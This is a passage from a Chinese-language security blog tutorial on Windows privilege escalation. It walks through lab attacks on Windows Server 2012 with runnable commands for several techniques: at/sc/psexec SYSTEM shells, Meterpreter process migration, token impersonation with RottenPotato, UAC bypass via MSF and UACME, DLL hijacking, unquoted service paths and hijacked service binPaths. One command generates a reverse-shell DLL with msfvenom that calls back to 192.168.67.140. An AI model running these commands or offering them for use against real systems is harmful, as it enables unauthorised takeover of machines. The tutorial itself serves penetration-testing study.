class="hljs-keyword">if</span> strings.Contains(all[i][<span class="hljs-number">7</span>], <span class="hljs-string">&quot;Privilege&quot;</span>) &#123;<br>			subdomains = <span class="hljs-built_in">append</span>(subdomains, all[i][<span class="hljs-number">1</span>])<br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">return</span> Deduplication(subdomains)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>	exp := <span class="hljs-string">&quot;exp&quot;</span><br>	cve := <span class="hljs-string">&quot;cve.csv&quot;</span><br>	fmt.Println(<span class="hljs-string">&quot;[+]&quot;</span>,<span class="hljs-string">&quot;start ....&quot;</span>)<br>	dir,_ := os.Getwd()<br>	<span class="hljs-keyword">var</span> YesEXP,NoEXP []<span class="hljs-type">string</span><br>	<span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> ReadCsv(cve) &#123;<br>		path := Cmd(<span class="hljs-string">&quot;find&quot;</span>, exp, <span class="hljs-string">&quot;-name&quot;</span>, v)<br>		path = strings.TrimRight(path,<span class="hljs-string">&quot;\n&quot;</span>)<br>		path = strings.Replace(path,<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot; | &quot;</span>+dir+<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-number">10</span>)<br>		<span class="hljs-keyword">if</span> v != <span class="hljs-string">&quot;&quot;</span>&#123;<br>			<span class="hljs-keyword">if</span> path != <span class="hljs-string">&quot;&quot;</span>&#123;<br>				YesEXP = <span class="hljs-built_in">append</span>(YesEXP,v+<span class="hljs-string">&quot; --&gt; &quot;</span>+dir+<span class="hljs-string">&quot;/&quot;</span>+path)<br>			&#125;<span class="hljs-keyword">else</span>&#123;<br>				NoEXP = <span class="hljs-built_in">append</span>(NoEXP,v)<br>			&#125;<br>		&#125;<br>	&#125;<br>	fmt.Println(<span class="hljs-string">&quot;YesEXP:&quot;</span>,<span class="hljs-built_in">len</span>(YesEXP))<br>	<span class="hljs-keyword">for</span> _,v := <span class="hljs-keyword">range</span> YesEXP&#123;<br>		fmt.Println(<span class="hljs-string">&quot;[+]&quot;</span>,v)<br>	&#125;<br>	fmt.Println(<span class="hljs-string">&quot;NoEXP:&quot;</span>,<span class="hljs-built_in">len</span>(NoEXP))<br>	<span class="hljs-keyword">for</span> _,v := <span class="hljs-keyword">range</span> NoEXP&#123;<br>		fmt.Println(<span class="hljs-string">&quot;[+]&quot;</span>,v)<br>	&#125;<br>	fmt.Println(<span class="hljs-string">&quot;[+]&quot;</span>,<span class="hljs-string">&quot;Bye&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="AT-amp-SC-amp-PS"><a href="#AT-amp-SC-amp-PS" class="headerlink" title="AT&amp;SC&amp;PS"></a>AT&amp;SC&amp;PS</h2><p>AT&amp;SC&amp;PS命令提权的原理大致相同，系统执行一些任务、服务…时，会默认调用system权限，从而导致权限提升。</p>
<table>
<thead>
<tr>
<th align="center">命令</th>
<th align="center">作用</th>
<th align="center">使用版本</th>
</tr>
</thead>
<tbody><tr>
<td align="center">at</td>
<td align="center">计划任务</td>
<td align="center">2000&#x2F;2003&#x2F;XP</td>
</tr>
<tr>
<td align="center">sc</td>
<td align="center">服务控制</td>
<td align="center">7&#x2F;8&#x2F;2003&#x2F;2012&#x2F;2016&#x2F;2019</td>
</tr>
<tr>
<td align="center">psexec</td>
<td align="center">远程执行进程</td>
<td align="center">同上</td>
</tr>
</tbody></table>
<p>注：交互式的cmd窗口无法生成时，可以执行后门来反弹shell，可能只是无法执行交互式的任务，而不是无法执行。</p>
<h3 id="1-利用-1"><a href="#1-利用-1" class="headerlink" title="1.利用"></a>1.利用</h3><h4 id="1-at"><a href="#1-at" class="headerlink" title="1.at"></a>1.at</h4><p>计划命令，默认调用system权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">at 21:00 /interactive cmd		<span class="hljs-comment"># 21:00生成一个交互式的System权限的cmd窗口</span><br></code></pre></td></tr></table></figure>

<h4 id="2-sc"><a href="#2-sc" class="headerlink" title="2.sc"></a>2.sc</h4><p>用于服务控制管理器和服务进行通信的命令行程序，功能类似于控制面板中管理工具项中的服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sc Create syscmd binPath=<span class="hljs-string">&quot;cmd /K start&quot;</span> <span class="hljs-built_in">type</span>=own <span class="hljs-built_in">type</span>=interact		<br>sc start syscmd		<span class="hljs-comment"># 运行服务</span><br></code></pre></td></tr></table></figure>

<h4 id="3-psexec"><a href="#3-psexec" class="headerlink" title="3.psexec"></a>3.psexec</h4><p>pstools：微软官方的一个工具包</p>
<p>pstools：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p>
<p>psexec：pstools 中一个可以执行进程的工具</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208103110277.png" srcset="/img/loading.gif" lazyload alt="image-20230208103110277"></p>
<p>利用 psexec 进行提权。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">psexec<span class="hljs-selector-class">.exe</span> -accepteula -s -<span class="hljs-selector-tag">i</span> -d cmd.exe<br></code></pre></td></tr></table></figure>

<h3 id="2-实操-1"><a href="#2-实操-1" class="headerlink" title="2.实操"></a>2.实操</h3><h4 id="1-sc"><a href="#1-sc" class="headerlink" title="1.sc"></a>1.sc</h4><p>目标：windows server 2012</p>
<p>执行交互式的cmd服务失败，根据警告发现可能是交互式的问题：</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208094012192.png" srcset="/img/loading.gif" lazyload alt="image-20230208094012192"></p>
<p>那么就利用sc执行msf后门，成功：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> Create sysmsf binPath=<span class="hljs-string">&quot;C:\Users\Administrator\Desktop\shell.exe&quot;</span> <span class="hljs-built_in">type</span>=own<br><span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> sysmsf<br></code></pre></td></tr></table></figure>

<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208102053587.png" srcset="/img/loading.gif" lazyload alt="image-20230208102053587"></p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208102018939.png" srcset="/img/loading.gif" lazyload alt="image-20230208102018939"></p>
<h4 id="2-psexec"><a href="#2-psexec" class="headerlink" title="2.psexec"></a>2.psexec</h4><p>下载pstools，将psexec上传到目标。</p>
<p>弹cmd窗口：</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208104656413.png" srcset="/img/loading.gif" lazyload alt="image-20230208104656413"></p>
<p>弹shell：</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208104812952.png" srcset="/img/loading.gif" lazyload alt="image-20230208104812952"></p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208104825955.png" srcset="/img/loading.gif" lazyload alt="image-20230208104825955"></p>
<h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2><h3 id="1-利用-2"><a href="#1-利用-2" class="headerlink" title="1.利用"></a>1.利用</h3><p>适用版本：2008&#x2F;2012&#x2F;2016&#x2F;2019</p>
<p>原理：将后门注入到system权限进程下，线程继承了system进程的权限，实现权限提升。</p>
<p>使用工具：MSF、pinjector(仅适用于2008之前的版本，这里就不使用了)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ps					# 查看进程		<br>migrate 180			# 迁移到PID为180的进程<br></code></pre></td></tr></table></figure>

<h3 id="2-实操-2"><a href="#2-实操-2" class="headerlink" title="2.实操"></a>2.实操</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps					<br>migrate 3060			<br>getuid<br></code></pre></td></tr></table></figure>

<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208113756969.png" srcset="/img/loading.gif" lazyload alt="image-20230208113756969"></p>
<h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><p>令牌窃取一般使用于本地用户，不过在于烂土豆漏洞配合的情况下，可以从<strong>服务权限</strong> (仅适用于服务权限) 进行提权。</p>
<h3 id="1-利用-3"><a href="#1-利用-3" class="headerlink" title="1.利用"></a>1.利用</h3><p>适用版本：2003&#x2F;2008&#x2F;2012&#x2F;2016&#x2F;2019</p>
<p>使用工具：MSF</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> incognito<br>list_tokens -u<br>impersonate_token <span class="hljs-string">&quot;令牌&quot;</span><br></code></pre></td></tr></table></figure>

<p>烂土豆配合令牌窃取提权：</p>
<p>烂土豆是溢出漏洞，令牌窃取适用于本地权限提升，可以使用烂土豆和令牌窃取进行配合实现<strong>webshell</strong>的权限提升。</p>
<p>适用条件：</p>
<ol>
<li>烂土豆未打补丁</li>
<li>当前权限为<strong>服务权限</strong>，而非本地用户</li>
</ol>
<p>MS16-075 RottenPotato原理：</p>
<ol>
<li>欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。</li>
<li>对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。</li>
<li>模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。</li>
</ol>
<p><strong>RottenPotato</strong>下载：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe">https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe">https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/foxglovesec/RottenPotato">https://github.com/foxglovesec/RottenPotato</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">执行烂土豆EXP</span><br>execute -cH -f potato.exe	<br><span class="hljs-meta prompt_"># </span><span class="language-bash">令牌窃取</span><br>use incognito<br>list_tokens -u<br>impersonate_token &quot;令牌&quot;<br></code></pre></td></tr></table></figure>

<h3 id="2-实操-3"><a href="#2-实操-3" class="headerlink" title="2.实操"></a>2.实操</h3><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">getuid<br><span class="hljs-keyword">use</span> incognito<br>list_tokens -u<br>impersonate_token <span class="hljs-string">&quot;NT AUTHORITY\SYSTEM&quot;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208115110564.png" srcset="/img/loading.gif" lazyload alt="image-20230208115110564"></p>
<h2 id="getsystem"><a href="#getsystem" class="headerlink" title="getsystem"></a>getsystem</h2><h3 id="1-利用-4"><a href="#1-利用-4" class="headerlink" title="1.利用"></a>1.利用</h3><p>getsystem 是MSF中针对windows管理员组用户的一个自动提权模块，其使用条件为：</p>
<ol>
<li>管理员组的成员</li>
<li>UAC：<ol>
<li>非最高等级：MSF内置模块，UACME 进行绕过</li>
<li>最高等级：使用MSF ask模块，会给目标弹出一个UAC的框，用户确定后，即可绕过UAC提权</li>
</ol>
</li>
</ol>
<p>查看当前用户是否属于管理员组：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">net localgroup Administrators	# 查看本地管理员组成员<br>whoami	# 查看当前用户名<br></code></pre></td></tr></table></figure>

<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230214212026690.png" srcset="/img/loading.gif" lazyload alt="image-20230214212026690"></p>
<p>UAC -&gt; 用户账户控制</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212193308387.png" srcset="/img/loading.gif" lazyload alt="image-20230212193308387"></p>
<p>BypassUAC：</p>
<ol>
<li>MSF 内置模块</li>
<li>UACME 工具</li>
</ol>
<p>MSF：</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212215054023.png" srcset="/img/loading.gif" lazyload alt="image-20230212215054023"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/local/bypassuac		<br>use exploit/windows/local/ask		<span class="hljs-comment"># 询问模式</span><br></code></pre></td></tr></table></figure>

<p>UACME：<a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">akagi64 61 shell.exe	<span class="hljs-comment"># 使用第61模式去执行后门，然后使用getsystem进行提权</span><br></code></pre></td></tr></table></figure>

<h3 id="2-实操-4"><a href="#2-实操-4" class="headerlink" title="2.实操"></a>2.实操</h3><h4 id="1-无UAC"><a href="#1-无UAC" class="headerlink" title="1.无UAC"></a>1.无UAC</h4><p>查看当前用户是否属于管理员组：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net localgroup Administrators		<span class="hljs-comment"># 查看管理员组成员</span><br></code></pre></td></tr></table></figure>

<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212200939237.png" srcset="/img/loading.gif" lazyload alt="image-20230212200939237"></p>
<p>当前用户 <code>admin </code>在管理员组中，可以使用 <code>getsystem</code> 进行提权，直接提权成功。</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212201031688.png" srcset="/img/loading.gif" lazyload alt="image-20230212201031688"></p>
<h4 id="2-BypassUAC"><a href="#2-BypassUAC" class="headerlink" title="2.BypassUAC"></a>2.BypassUAC</h4><p>UAC -&gt; 默认，第三级</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212193944834.png" srcset="/img/loading.gif" lazyload alt="image-20230212193944834"></p>
<p>提权尝试 -&gt; 失败</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212194138937.png" srcset="/img/loading.gif" lazyload alt="image-20230212194138937"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/local/bypassuac		<span class="hljs-comment"># MSF中内置的BypassUAC模块</span><br><span class="hljs-built_in">set</span> ...<br>run<br></code></pre></td></tr></table></figure>

<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212214811475.png" srcset="/img/loading.gif" lazyload alt="image-20230212214811475"></p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">getsystem</span><br></code></pre></td></tr></table></figure>

<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212214847628.png" srcset="/img/loading.gif" lazyload alt="image-20230212214847628"></p>
<h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><h3 id="1-利用-5"><a href="#1-利用-5" class="headerlink" title="1.利用"></a>1.利用</h3><p>DLL介绍：</p>
<ol>
<li>DLL：动态链接库</li>
<li>DLL 是一个包含可由多个程序同时使用的代码和数据的库。</li>
</ol>
<p>DLL劫持提权：</p>
<ol>
<li><p>在程序运行后，就需要从DLL中加载其需要使用的代码，根据这个特性，我们将某个DLL替换为一个包含后门的DLL文件，在这个程序运行时，就会自动加载这个DLL文件，从而触发后门代码，使我们成功得到一个shell。</p>
</li>
<li><p>DLL劫持具体获取的权限一般取决于<strong>运行此程序时用户的权限</strong>，一般是管理员组的用户，这时再使用MSF的<code>getsystem</code>或者其他方式继续提升到<code>system</code> 权限。</p>
</li>
</ol>
<p>使用工具：</p>
<ol>
<li>DLL分析：WinDbg、火绒剑</li>
<li>DLL劫持验证：ChkDllHijack </li>
<li>DLL后门生成：MSF</li>
</ol>
<p>工具下载：</p>
<ol>
<li>WinDebug：<a target="_blank" rel="noopener" href="http://download.microsoft.com/download/A/6/A/A6AC035D-DA3F-4F0C-ADA4-37C8E5D34E3D/setup/WinSDKDebuggingTools_amd64/dbg_amd64.msi">http://download.microsoft.com/download/A/6/A/A6AC035D-DA3F-4F0C-ADA4-37C8E5D34E3D/setup/WinSDKDebuggingTools_amd64/dbg_amd64.msi</a></li>
<li>ChkDllHijack：<a target="_blank" rel="noopener" href="https://github.com/anhkgg/anhkgg-tools">https://github.com/anhkgg/anhkgg-tools</a></li>
</ol>
<p>工具使用：</p>
<p>WinDebug：</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213232945032.png" srcset="/img/loading.gif" lazyload alt="image-20230213232945032"></p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213233019826.png" srcset="/img/loading.gif" lazyload alt="image-20230213233019826"></p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213233040579.png" srcset="/img/loading.gif" lazyload alt="image-20230213233040579"></p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213233509662.png" srcset="/img/loading.gif" lazyload alt="image-20230213233509662"></p>
<p>ChkDllHijack：</p>
<p>把WinDebug的dll复制到这里，再选择好目标exe文件。</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213233706067.png" srcset="/img/loading.gif" lazyload alt="image-20230213233706067"></p>
<p>这个工具会一直测试dll文件(一直启动目标程序)，最后会显示出可以替换的dll文件：</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213234055666.png" srcset="/img/loading.gif" lazyload alt="image-20230213234055666"></p>
<p>MSF生成DLL后门：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.67.140 <span class="hljs-attribute">lport</span>=12345 -f dll &gt; libeay32.dll<br></code></pre></td></tr></table></figure>

<h3 id="2-实操-5"><a href="#2-实操-5" class="headerlink" title="2.实操"></a>2.实操</h3><p>目标机器上有flashfxp，本地安装一下。</p>
<p>使用WinDebuy启动软件，查看其dll调用情况。</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213213007743.png" srcset="/img/loading.gif" lazyload alt="image-20230213213007743"></p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213220818574.png" srcset="/img/loading.gif" lazyload alt="image-20230213220818574"></p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213224207793.png" srcset="/img/loading.gif" lazyload alt="image-20230213224207793"></p>
<p>这里使用<code>libeay32.dll</code>：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.67.140 <span class="hljs-attribute">lport</span>=12345 -f dll &gt; libeay32.dll<br></code></pre></td></tr></table></figure>

<p>这个测试没有成功，的确调用了dll文件，但是无法反弹shell。</p>
<h2 id="服务路径"><a href="#服务路径" class="headerlink" title="服务路径"></a>服务路径</h2><h3 id="1-利用-6"><a href="#1-利用-6" class="headerlink" title="1.利用"></a>1.利用</h3><p>其根本原理还是系统调用服务时默认会以system权限去运行，导致权限提升。</p>
<p>原理：当服务路径 <strong>不带引号</strong> 且 <strong>路径中存在空格</strong> 时，可以将其看作 [命令][空格][参数] 的形式，上传一个与 [命令] 同名的exe文件，当服务启动后，会运行 [命令]，而在windows中exe文件可以不加后缀就执行，导致服务启动时执行了我们上传的EXE文件，实现了权限提升。</p>
<p>带引号和不带引号的区别：</p>
<p><code>&quot;C:\Program Files\Everything\Everything.exe&quot;</code>：表示的是一个命令整体</p>
<p><code>C:\Program Files\Everything\Everything.exe</code>：由于 <code>C:\Program</code> 后有空格，则表示为 <code>C:\Program</code> 是命令，而<code>Files\Everything\Everything.exe </code>是 <code>C:\Program  </code>命令的参数</p>
<p>运行后如下：</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213121142976.png" srcset="/img/loading.gif" lazyload alt="image-20230213121142976"></p>
<p>使用 wmic 检查不带引号的服务路径：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic service get name,displayname,pathname,startmode |findstr /i <span class="hljs-string">&quot;Auto&quot;</span> |findstr /i /v <span class="hljs-string">&quot;C:\Windows\\&quot;</span>|findstr /i /v <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>

<p>使用 sc 命令启动服务：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> [<span class="hljs-type">displayname</span>]<br></code></pre></td></tr></table></figure>

<p>利用流程：</p>
<ol>
<li>使用wmic寻找不安全的服务路径</li>
<li>制作同名的后门，上传到指定位置</li>
<li>启动监听，重启服务</li>
</ol>
<h3 id="2-实操-6"><a href="#2-实操-6" class="headerlink" title="2.实操"></a>2.实操</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic service get name,displayname,pathname,startmode |findstr /i <span class="hljs-string">&quot;Auto&quot;</span> |findstr /i /v <span class="hljs-string">&quot;C:\Windows\\&quot;</span>|findstr /i /v <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213211052896-16762938548401.png" srcset="/img/loading.gif" lazyload alt="image-20230213211052896"></p>
<p>发现phpStudySrv服务路径不带引号且路径中存在空格，那么就修改后门名为 <code>Program.exe</code>，上传到 <code>C:\</code></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">upload <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Desktop/</span>Program.exe C:/<br></code></pre></td></tr></table></figure>

<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213211526717.png" srcset="/img/loading.gif" lazyload alt="image-20230213211526717"></p>
<p>启动新的MSF监听，启动服务，提权成功：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> phpStudySrv<br></code></pre></td></tr></table></figure>

<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213212351569.png" srcset="/img/loading.gif" lazyload alt="image-20230213212351569"></p>
<h2 id="服务权限"><a href="#服务权限" class="headerlink" title="服务权限"></a>服务权限</h2><h3 id="1-利用-7"><a href="#1-利用-7" class="headerlink" title="1.利用"></a>1.利用</h3><p>原理：某些服务可以权限设置不恰当，导致可以被低权限的用户修改其服务路径，从而直接将服务路径指向后门文件，导致权限提升。</p>
<p>使用工具：accesschk</p>
<p>工具介绍：微软官方的 windows系统配置检查工具，用于查看文件、注册表项、服务、进程、内核对象等的有效权限。<strong>该工具将有助于识别当前用户是否可以修改某个服务目录中的文件。</strong>我们可以使用该工具查看当前用户可以修改的服务。</p>
<p>accesschk：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/accesschk">https://learn.microsoft.com/zh-cn/sysinternals/downloads/accesschk</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula	# 接收许可<br>accesschk.exe -uwcqv &quot;fuming&quot; *	 # 查看用户fuming可以修改的服务<br></code></pre></td></tr></table></figure>

<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230214220937763.png" srcset="/img/loading.gif" lazyload alt="image-20230214220937763"></p>
<p>RW 就代表着可以读写。RW后面跟的就是是服务名。</p>
<p>之后就是修改服务路径，启动服务。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sc stop [服务名]<br>sc config [服务名] binPath= [可执行文件路径]<br>sc start [服务名]<br></code></pre></td></tr></table></figure>

<h3 id="2-实操-7"><a href="#2-实操-7" class="headerlink" title="2.实操"></a>2.实操</h3><p>上传 accesschk：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">pwd<br>upload <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Desktop/</span>accesschk.exe C:\\Users\\Administrator\\Desktop<br></code></pre></td></tr></table></figure>

<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230214222451668.png" srcset="/img/loading.gif" lazyload alt="image-20230214222451668"></p>
<p>运行 accesschk，查看是否可以修改服务路径：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">execute -if accesschk.exe -a &quot;/accepteula&quot;		# 添加许可<br></code></pre></td></tr></table></figure>

<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230214222748510.png" srcset="/img/loading.gif" lazyload alt="image-20230214222748510"></p>
<p>查看当前用户可以修改的服务：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">getuid <br>execute -<span class="hljs-keyword">if</span> accesschk.exe -a <span class="hljs-string">&quot;-uwcqv &quot;</span>Administrato<span class="hljs-string">r&quot; *&quot;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230214222938995.png" srcset="/img/loading.gif" lazyload alt="image-20230214222938995"></p>
<p>替换服务指向路径，路径设置为MSF的后门程序：</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>stop Appinfo<br><span class="hljs-keyword">sc </span><span class="hljs-built_in">config</span> Appinfo <span class="hljs-keyword">binPath= </span><span class="hljs-string">&quot;C:\Users\Administrator\Desktop\shell.exe&quot;</span><br><span class="hljs-keyword">sc </span>start Appinfo<br></code></pre></td></tr></table></figure>

<p>修改后，启动MSF监听，启动服务，提权成功。</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230214223402301.png" srcset="/img/loading.gif" lazyload alt="image-20230214223402301"></p>
<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>使用工具：</p>
<ol>
<li>MSF</li>
<li>Navicat</li>
</ol>
<h3 id="1-MySql"><a href="#1-MySql" class="headerlink" title="1.MySql"></a>1.MySql</h3><p>前提条件：</p>
<ol>
<li>root 用户 -&gt; 文件写入的权限</li>
<li>secure_file_priv为空 -&gt; 文件写入位置不受限制</li>
</ol>
<h4 id="1-udf提权"><a href="#1-udf提权" class="headerlink" title="1.udf提权"></a>1.udf提权</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><p>udf -&gt; user defined function -&gt; 用户自定义函数</p>
<p>udf 提权就是用户定义了一个执行命令的函数从而实现系统命令的执行。</p>
<p>udf 文件后缀在windows与linux系统下分别为dll与so，即动态链接库文件，由C、C++编写。</p>
<p>udf 在mysql5.1以后的版本中，存放于’mysql&#x2F;lib&#x2F;plugin’目录下。5.1 之前 c:\windows\system32 。</p>
